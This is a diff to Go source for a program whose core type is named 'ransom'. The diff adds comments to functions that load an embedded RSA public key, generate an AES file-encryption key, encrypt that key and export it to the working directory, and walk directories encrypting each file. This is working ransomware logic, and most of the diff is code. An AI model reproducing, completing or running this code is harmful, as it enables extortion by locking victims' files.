@@ -27,7 +27,8 @@ type ransom struct {
 	aes      cipher.Block  // file-encryption
 }
 
-// decode public key, generate tokens and export encrypted data
+// decode public key, generate and export
+// encrypted AES chipers, together clear-text message
 func start(msg string) *ransom {
 	public_key := parse_key(KEY)
 
@@ -45,6 +46,7 @@ func start(msg string) *ransom {
 	return rns
 }
 
+// decode rsa public key so it can be used for encryption
 func parse_key(key string) *rsa.PublicKey {
 	pk := decode(key)
 	pbk, _ := pem.Decode(pk)
@@ -54,8 +56,8 @@ func parse_key(key string) *rsa.PublicKey {
 	return public_key
 }
 
+// encrypt message with RSA public key
 func (keys *ransom) encrypt(msg string) []byte {
-
 	message := []byte(msg)
 	label := []byte("")
 	hash := sha256.New()
@@ -67,6 +69,7 @@ func (keys *ransom) encrypt(msg string) []byte {
 	return cipher_text
 }
 
+// export (encrypted AES) key in a working directory
 func export(key []byte, label string) {
 	wd, _ := os.Getwd()
 	path := filepath.Join(wd, label)
@@ -74,18 +77,21 @@ func export(key []byte, label string) {
 	handleError(err)
 }
 
+// get RSA encrypted message in a readable format
 func MessageToPEM(msg []byte) []byte {
 	return pem.EncodeToMemory(&pem.Block{
 		Type:  "MESSAGE",
 		Bytes: msg})
 }
 
+// if we can't get encryption working, no point of running program
 func handleError(err error) {
 	if err != nil {
 		panic(err)
 	}
 }
 
+// generate 32bytes for AES password
 func token() string {
 	r_bytes := make([]byte, 32)
 	_, err := rand.Read(r_bytes)
@@ -94,16 +100,19 @@ func token() string {
 	return encode(string(r_bytes))
 }
 
+// base64 encode
 func encode(key string) string {
 	return base64.URLEncoding.EncodeToString([]byte(key))
 }
 
+// base64 decode
 func decode(enkey string) []byte {
 	key, err := base64.URLEncoding.DecodeString(enkey)
 	handleError(err)
 	return key
 }
 
+// walk through directories and encrypt each file
 func (keys *ransom) walk(s string, d fs.DirEntry, err error) error {
 	if err != nil {
 		return err
